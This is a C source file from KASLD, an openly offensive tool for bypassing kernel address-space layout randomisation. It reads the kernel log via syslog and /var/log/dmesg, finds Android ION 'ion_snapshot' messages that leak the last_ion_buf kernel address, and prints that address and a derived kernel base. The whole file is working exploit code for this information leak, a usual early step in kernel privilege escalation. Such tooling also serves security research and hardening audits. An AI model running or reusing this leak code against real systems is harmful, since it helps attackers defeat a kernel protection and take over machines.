// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Search kernel log for Android ION ion_snapshot map message which
// prints last_ion_buf symbol address:
//
//   ion_snapshot: 0x7e9d0000 map to 0xe0907000 and copy to 0xc0e5d374
//
// Android ION drivers were removed in kernel v5.11-rc1.
//
// Requires:
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities; or
//   readable /var/log/dmesg.
//
// References:
// https://lwn.net/Articles/576966/
// https://lwn.net/Articles/565469/
// https://lwn.net/Articles/480055/
// https://elixir.bootlin.com/linux/v5.10.89/source/drivers/staging/android/ion
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "kasld.h"
#include "include/syslog.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

unsigned long search_dmesg_ion_snapshot() {
  char *addr_buf;
  char *line_buf;
  char *substr;
  char *syslog;
  char *endptr;
  const char *needle1 = "ion_snapshot: ";
  const char *needle2 = "and copy to 0x";
  int size;
  unsigned long addr = 0;

  printf("[.] searching dmesg for '%s' ...\n", needle1);

  if (mmap_syslog(&syslog, &size))
    return 0;

  substr = strstr(syslog, needle1);
  if (substr == NULL)
    return 0;

  line_buf = strtok(substr, "\n");
  if (line_buf == NULL)
    return 0;

  addr_buf = strstr(substr, needle2);
  if (addr_buf == NULL)
    return 0;

  addr = strtoul(&addr_buf[strlen(needle2)], &endptr, 16);

  if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
    return addr;

  return 0;
}

unsigned long search_dmesg_log_file_ion_snapshot() {
  FILE *f;
  char *endptr;
  char *substr;
  char *addr_buf;
  char *line_buf;
  const char *path = "/var/log/dmesg";
  const char *needle1 = "ion_snapshot: ";
  const char *needle2 = "and copy to 0x";
  unsigned long addr = 0;
  char buff[BUFSIZ];

  printf("[.] searching %s for '%s' ...\n", path, needle1);

  f = fopen(path, "rb");
  if (f == NULL) {
    perror("[-] fopen");
    return 0;
  }

  while ((fgets(buff, BUFSIZ, f)) != NULL) {
    substr = strstr(buff, needle1);
    if (substr == NULL)
      continue;

    line_buf = strtok(substr, "\n");
    if (line_buf == NULL)
      break;

    addr_buf = strstr(substr, needle2);
    if (addr_buf == NULL)
      break;

    addr = strtoul(&addr_buf[strlen(needle2)], &endptr, 16);

    if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
      break;
  }

  fclose(f);

  return addr;
}

int main() {
  unsigned long addr = search_dmesg_ion_snapshot();
  if (!addr)
    addr = search_dmesg_log_file_ion_snapshot();

  if (!addr)
    return 1;

  printf("leaked last_ion_buf: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);

  return 0;
}
